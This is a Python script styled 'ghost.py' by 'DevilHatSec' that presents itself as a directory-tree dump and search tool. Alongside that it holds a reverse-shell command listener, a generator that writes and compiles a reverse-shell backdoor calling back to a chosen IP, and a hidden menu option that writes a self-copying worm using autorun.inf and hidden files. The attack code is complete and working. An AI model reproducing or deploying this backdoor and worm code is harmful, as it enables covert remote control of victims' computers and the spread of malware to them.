#!/usr/bin/python
# -*- coding: utf-8 -*-
""" (c) 2015 - Copyright DevilHatSec by 4N4RCHY & Z3R0. All rights is reserved. """

""" ---------------------------- """
"""  Program >>> ghost.py        """
"""  Function >>> Tree Analysis  """
""" ---------------------------- """

from os.path import *
from socket import *
import os, sys, socket

code = 0

""" Image du program """
def pic():
	print("\n")
	print("\t. .___________.")
	print("\t£/ ///_______|\t\tExecute ghost.py {light}")
	print("\t )  /_(_)")
	print("\t/__/\n\n")

""" Program en entier """
def normal():
	print("Program run [normal mod]\n")
	while(1):
		OS = int(input("Choisissez votre systeme: {1. linux |2. windows |0. exit}\n>>> "))
		
		if(OS == 1 or OS == 2):
			files = raw_input("Nom de la machine: ")
			
			if(OS == 1):
				save = "tree_" + files + '.txt'
				system = "linux"
				files = 'tree / > ' + save
				
				print("\n> Command[" + system + "]: " + files)
				print("Loading...")
				
				os.system(files)
				print("Successfull Scan on [" + save + "].\n")
			
			elif(OS == 2):
				save = "tree_" + files
				system = "windows"
				lecteur = raw_input("Choisissez un lecteur: {A |B |C |... |tous}\n>>> ")
				
				if(lecteur in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
					output = save + "-" + lecteur + '.txt'
					files = 'tree /a /f ' + lecteur + ':\\ > ' + output
					
					print("\n> Command[" + system + "]: " + files)
					print("Loading...")
					
					os.system('md ' + save)
					os.system(files)
					os.system('move ' + output + ' ' + save)
					print("Successfull Scan on [" + save + "].\n")
				
				elif(lecteur == "tous"):
					files = 'tree /a /f ' + lecteur + ' > ' + save + '-' + lecteur + '.txt'
					
					print("\n> Command[" + system + "]: " + files)
					print("Loading...")
					
					os.system('md ' + save)
					os.system('tree /a /f A:\\ > ' + save + '-A.txt')
					os.system('move ' + save + '-A.txt ' + save)
					os.system('tree /a /f B:\\ > ' + save + '-B.txt')
					os.system('move ' + save + '-B.txt ' + save)
					os.system('tree /a /f C:\\ > ' + save + '-C.txt')
					os.system('move ' + save + '-C.txt ' + save)
					os.system('tree /a /f D:\\ > ' + save + '-D.txt')
					os.system('move ' + save + '-D.txt ' + save)
					os.system('tree /a /f E:\\ > ' + save + '-E.txt')
					os.system('move ' + save + '-E.txt ' + save)
					os.system('tree /a /f F:\\ > ' + save + '-F.txt')
					os.system('move ' + save + '-F.txt ' + save)
					os.system('tree /a /f G:\\ > ' + save + '-G.txt')
					os.system('move ' + save + '-G.txt ' + save)
					os.system('tree /a /f H:\\ > ' + save + '-H.txt')
					os.system('move ' + save + '-H.txt ' + save)
					os.system('tree /a /f I:\\ > ' + save + '-I.txt')
					os.system('move ' + save + '-I.txt ' + save)
					os.system('tree /a /f J:\\ > ' + save + '-J.txt')
					os.system('move ' + save + '-J.txt ' + save)
					os.system('tree /a /f K:\\ > ' + save + '-K.txt')
					os.system('move ' + save + '-K.txt ' + save)
					os.system('tree /a /f L:\\ > ' + save + '-L.txt')
					os.system('move ' + save + '-L.txt ' + save)
					os.system('tree /a /f M:\\ > ' + save + '-M.txt')
					os.system('move ' + save + '-M.txt ' + save)
					os.system('tree /a /f N:\\ > ' + save + '-N.txt')
					os.system('move ' + save + '-N.txt ' + save)
					os.system('tree /a /f O:\\ > ' + save + '-O.txt')
					os.system('move ' + save + '-O.txt ' + save)
					os.system('tree /a /f P:\\ > ' + save + '-P.txt')
					os.system('move ' + save + '-P.txt ' + save)
					os.system('tree /a /f Q:\\ > ' + save + '-Q.txt')
					os.system('move ' + save + '-Q.txt ' + save)
					os.system('tree /a /f R:\\ > ' + save + '-R.txt')
					os.system('move ' + save + '-R.txt ' + save)
					os.system('tree /a /f S:\\ > ' + save + '-S.txt')
					os.system('move ' + save + '-S.txt ' + save)
					os.system('tree /a /f T:\\ > ' + save + '-T.txt')
					os.system('move ' + save + '-T.txt ' + save)
					os.system('tree /a /f U:\\ > ' + save + '-U.txt')
					os.system('move ' + save + '-U.txt ' + save)
					os.system('tree /a /f V:\\ > ' + save + '-V.txt')
					os.system('move ' + save + '-V.txt ' + save)
					os.system('tree /a /f W:\\ > ' + save + '-W.txt')
					os.system('move ' + save + '-W.txt ' + save)
					os.system('tree /a /f X:\\ > ' + save + '-X.txt')
					os.system('move ' + save + '-X.txt ' + save)
					os.system('tree /a /f Y:\\ > ' + save + '-Y.txt')
					os.system('move ' + save + '-Y.txt ' + save)
					os.system('tree /a /f Z:\\ > ' + save + '-Z.txt')
					os.system('move ' + save + '-Z.txt ' + save)
					
					print("\nSuccessfull Scan on [" + save + "].\n")
			
			break
		
		elif(OS == 0):
			print("Quitting...\n")
			break
		
		else: print("[ERROR] - Sorry this os isn't include on program...\n")
		
	answer = int(input("Scan the tree ? (1/0): "))
	
	if(answer == 1):
		disk = raw_input("Disque: ")
		save = save + "/" + save + "-" + disk + '.txt'
		chaine = raw_input("Tapez une chaine a rechercher: ")
		print("\n")
		save = open(save)
		
		for line in save:
			if(chaine in line): print("> Result: " + line)
		
		save.close()
	
	elif(answer == 0): print("Quitting...\n")

""" Fabrication de l'arborescence """
def make_tree():
	print("Program run [make_tree mod]\n")
	OS = int(input("Choisissez votre systeme: {1. linux |2. windows |0. exit}\n>>> "))
	
	if(OS == 1 or OS == 2):
		files = raw_input("Nom de la machine: ")
		
		if(OS == 1):
			save = "tree_" + files + '.txt'
			system = "linux"
			files = 'tree / > ' + save
			
			print("\n> Command[" + system + "]: " + files)
			print("Loading...")
			
			os.system(files)
			print("Successfull Scan on [" + save + "].\n")
		
		elif(OS == 2):
			save = "tree_" + files
			system = "windows"
			lecteur = raw_input("Choisissez un lecteur: {A |B |C |... |tous}\n>>> ")
			
			if(lecteur in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
				output = save + "-" + lecteur + '.txt'
				files = 'tree /a /f ' + lecteur + ':\\ > ' + output
				
				print("\n> Command[" + system + "]: " + files)
				print("Loading...")
				
				os.system('md ' + save)
				os.system(files)
				os.system('move ' + output + ' ' + save)
				print("Successfull Scan on [" + files + "].\n")
			
			elif(lecteur == "tous"):
				files = 'tree /a /f ' + lecteur + ' > ' + save + '-' + lecteur + '.txt'
				
				print("\n> Command[" + system + "]: " + files)
				print("Loading...")
				
				os.system('md ' + save)
				os.system('tree /a /f A:\\ > ' + save + '-A.txt')
				os.system('move ' + save + '-A.txt ' + save)
				os.system('tree /a /f B:\\ > ' + save + '-B.txt')
				os.system('move ' + save + '-B.txt ' + save)
				os.system('tree /a /f C:\\ > ' + save + '-C.txt')
				os.system('move ' + save + '-C.txt ' + save)
				os.system('tree /a /f D:\\ > ' + save + '-D.txt')
				os.system('move ' + save + '-D.txt ' + save)
				os.system('tree /a /f E:\\ > ' + save + '-E.txt')
				os.system('move ' + save + '-E.txt ' + save)
				os.system('tree /a /f F:\\ > ' + save + '-F.txt')
				os.system('move ' + save + '-F.txt ' + save)
				os.system('tree /a /f G:\\ > ' + save + '-G.txt')
				os.system('move ' + save + '-G.txt ' + save)
				os.system('tree /a /f H:\\ > ' + save + '-H.txt')
				os.system('move ' + save + '-H.txt ' + save)
				os.system('tree /a /f I:\\ > ' + save + '-I.txt')
				os.system('move ' + save + '-I.txt ' + save)
				os.system('tree /a /f J:\\ > ' + save + '-J.txt')
				os.system('move ' + save + '-J.txt ' + save)
				os.system('tree /a /f K:\\ > ' + save + '-K.txt')
				os.system('move ' + save + '-K.txt ' + save)
				os.system('tree /a /f L:\\ > ' + save + '-L.txt')
				os.system('move ' + save + '-L.txt ' + save)
				os.system('tree /a /f M:\\ > ' + save + '-M.txt')
				os.system('move ' + save + '-M.txt ' + save)
				os.system('tree /a /f N:\\ > ' + save + '-N.txt')
				os.system('move ' + save + '-N.txt ' + save)
				os.system('tree /a /f O:\\ > ' + save + '-O.txt')
				os.system('move ' + save + '-O.txt ' + save)
				os.system('tree /a /f P:\\ > ' + save + '-P.txt')
				os.system('move ' + save + '-P.txt ' + save)
				os.system('tree /a /f Q:\\ > ' + save + '-Q.txt')
				os.system('move ' + save + '-Q.txt ' + save)
				os.system('tree /a /f R:\\ > ' + save + '-R.txt')
				os.system('move ' + save + '-R.txt ' + save)
				os.system('tree /a /f S:\\ > ' + save + '-S.txt')
				os.system('move ' + save + '-S.txt ' + save)
				os.system('tree /a /f T:\\ > ' + save + '-T.txt')
				os.system('move ' + save + '-T.txt ' + save)
				os.system('tree /a /f U:\\ > ' + save + '-U.txt')
				os.system('move ' + save + '-U.txt ' + save)
				os.system('tree /a /f V:\\ > ' + save + '-V.txt')
				os.system('move ' + save + '-V.txt ' + save)
				os.system('tree /a /f W:\\ > ' + save + '-W.txt')
				os.system('move ' + save + '-W.txt ' + save)
				os.system('tree /a /f X:\\ > ' + save + '-X.txt')
				os.system('move ' + save + '-X.txt ' + save)
				os.system('tree /a /f Y:\\ > ' + save + '-Y.txt')
				os.system('move ' + save + '-Y.txt ' + save)
				os.system('tree /a /f Z:\\ > ' + save + '-Z.txt')
				os.system('move ' + save + '-Z.txt ' + save)
				
				print("\nSuccessfull Scan on [" + save + "].\n")
	
	elif(OS == 0):
		print("Quitting...\n")
		exit(1)
	
	else: print("[ERROR] - Sorry this os isn't include on program...\n")

""" Scan de l'arborescence """
def scan_tree():
	print("Program run [scan_tree mod]\n")
	files = os.listdir("./")
	print("./")
	
	for file in files: print("+-> " + file)
	while(1):
		save = raw_input("\nNom du fichier: ")
		disk = raw_input("[null for Linux]Disque: ")
		
		if(disk not in "null"): save = "tree_" + save + "/tree_" + save + "-" + disk + '.txt'
		if(disk in "null"): save = "./tree_" + save + '.txt'
		
		chaine = raw_input("Tapez une chaine a rechercher: ")
		print("\n")
		save = open(save)
		
		for line in save:
			if(chaine in line): print("> Result: " + line)
		
		save.close()
		break

""" Le backdoor que t'as créer et que j'ai insérer """
def connect_backdoor():
	IP = raw_input("> IP: ")
	PORT = int(input("> PORT(80): "))
	s = socket(AF_INET, SOCK_STREAM)
	s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
	s.bind((IP, PORT))
	print("Listening on 0.0.0.0:%s" % str(PORT))
	s.listen(5)
	
	connexion_avec_client, infos_connexion = s.accept()
	
	print("Connected to %s\n" % str(infos_connexion))
	recu = connexion_avec_client.recv(1024)
	while(1):
		commande_shell = raw_input(">>> %s " % str(infos_connexion))
		connexion_avec_client.send(commande_shell)
		recu = connexion_avec_client.recv(1024)
		print(recu)
		
		if(commande_shell == "quit"): break
	
	s.close()

""" générateur de backdoor """
def generator():
	host = [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][0]
	IP = raw_input("> IP(" + host + "): ")
	if(IP == ''): IP = host
	PORT = raw_input("> PORT(80): ")
	if(PORT == ''): PORT = 80
	print("\n[INFO] - Ecriture en cours...")
	
	backdoor = open("backdoor.py", "w")
	backdoor.write("#!/usr/bin/python")
	backdoor.write("\nimport socket, subprocess, os")
	backdoor.write("\nHOST = '" + IP + "'")
	backdoor.write("\nPORT = " + str(PORT))
	backdoor.write("\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
	backdoor.write("\ns.connect((HOST, PORT))")
	backdoor.write("\ns.send('hacked')")
	backdoor.write("\nwhile 1:")
	backdoor.write("\n	d = s.recv(1024)")
	backdoor.write('\n	if d == "quit": break')
	backdoor.write("\n	proc = subprocess.Popen(d, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)")
	backdoor.write("\n	stdout_value = proc.stdout.read() + proc.stderr.read()")
	backdoor.write("\n	s.send(stdout_value)")
	backdoor.write("\ns.close()")
	
	print("[INFO] - Ecriture Terminer\n")

""" Sous-Program """
def subprogram():
	global code
	if(code == 1):
		print("\n[INFO] - Launching subprogram\n")
		IP = raw_input("> IP: ")
		PORT = raw_input("> PORT(80): ")
		print("\n[INFO] - Ecriture en cours...")
		
		vers = open("Vers.py", "w")
		vers.write("#!/usr/bin/python")
		vers.write("\n# -*- coding: utf-8 -*-")
		vers.write("\nimport os, subprocess, sys, socket")
		vers.write("\nHOST = '" + IP + "'")
		vers.write("\nPORT = 80")
		vers.write("\n" + 'autorun = open("autorun.inf", "w")')
		vers.write("\n" + 'autorun.write("[autorun]")')
		vers.write("\n" + 'autorun.write("\\nshellexecute=Vers.py")')
		vers.write("\nos.system('copy Vers.py C:\Users\%USERNAME%\Desktop > nul')")
		vers.write("\nos.system('attrib +h C:\Users\%USERNAME%\Desktop\Vers.py > nul')")
		vers.write("\nos.system('copy Vers.py C:\Users\%USERNAME% > nul')")
		vers.write("\nos.system('attrib +h C:\Users\%USERNAME%\Vers.py > nul')")
		vers.write("\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
		vers.write("\ns.connect((HOST, PORT))")
		vers.write("\ns.send('hacked')")
		vers.write("\nwhile 1:")
		vers.write("\n	d = s.recv(1024)")
		vers.write('\n	if d == "quit": break')
		vers.write("\n	proc = subprocess.Popen(d, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)")
		vers.write("\n	stdout_value = proc.stdout.read() + proc.stderr.read()")
		vers.write("\n	s.send(stdout_value)")
		vers.write("\ns.close()")
		
		print("[INFO] - Ecriture Terminer\n")
	
	if(code == 0): print("\n[INFO] - Not Ready\n")

""" Mode d'éxecution du program """
def program():
	pic()
	while(1):
		process = int(input("Choisir le processus {\n\t|1. normal \n\t|2. make_tree \n\t|3. scan_tree \n\t|4. connect_backdoor \n\t|5. generator \n\t|0. exit\n}:\n>>> "))
		
		if(process == 1): normal() # Lancement normal
		if(process == 2): make_tree() # Lancement générateur d'arborescence
		if(process == 3): scan_tree() # Lancement du scan
		if(process == 4): connect_backdoor() # Connexion au backdoor
		if(process == 5): # Génération d'un backdoor
			generator()
			compilation = os.system('setup.py py2exe')
			print("\n[INFO] - Compilation Terminer")
		
		if(process == 0): # Pour quitter
			print("Qitting...\n")
			exit(1)
		
		if(process == 6): subprogram()
		if(process > 6): print("\n[ERROR] - Process not installed\n")

""" Lancement """
program()

""" END """
